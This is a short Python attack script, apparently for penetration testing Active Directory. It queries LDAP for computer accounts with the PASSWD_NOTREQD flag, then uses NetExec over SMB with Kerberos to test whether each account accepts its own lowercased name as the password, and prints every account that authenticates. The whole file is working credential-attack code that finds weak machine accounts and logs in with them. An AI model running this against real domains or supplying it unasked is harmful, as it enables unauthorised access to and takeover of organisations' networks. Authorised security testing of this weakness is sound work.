#!/usr/bin/env python3
import ldap3,sys,argparse,subprocess,socket
a=argparse.ArgumentParser(description="PASSWD_NOTREQD Computer Account Tester")
a.add_argument('-u',required=True)
a.add_argument('-p',required=True)
a.add_argument('-d',required=True)
a.add_argument('--dc-ip',required=True)
a.add_argument('-t',default=None)
a.add_argument('-v',action='store_true',help="Verbose output")
o=a.parse_args()
s=o.d
h=o.dc_ip
u=o.u
p=o.p

try:
 fqdn = socket.gethostbyaddr(h)[0]
except:
 fqdn = s

c=ldap3.Server(h,get_info=ldap3.ALL)
b=",".join(["DC="+x for x in s.split(".")])
t=ldap3.Connection(c,user=u+"@"+s,password=p,auto_bind=True)
t.search("CN=Computers,"+b,"(objectClass=computer)",attributes=['cn','sAMAccountName','userAccountControl'])
r=t.entries

GREEN = "\033[92m"
RESET = "\033[0m"

for e in r:
 if int(e.userAccountControl.value)&32:
  n = str(e.cn.value).lower()
  m = str(e.sAMAccountName.value)
  
  if o.v:
   print(f"[*] Testing {m} (CN: {n})")
  
  try:
   cmd = ["nxc", "smb", (o.t if o.t else h), "-u", m, "-p", n, "-d", s, "-k", "--shares"]
   res = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
   out = res.stdout + res.stderr
   if "[+]" in out and m in out:
    print(f"{GREEN}[Kerberos] Authenticated as {m}:{n} at {fqdn} ({h}){RESET}")
  except:
   if o.v:
    print(f"[-] Failed {m}:{n}")
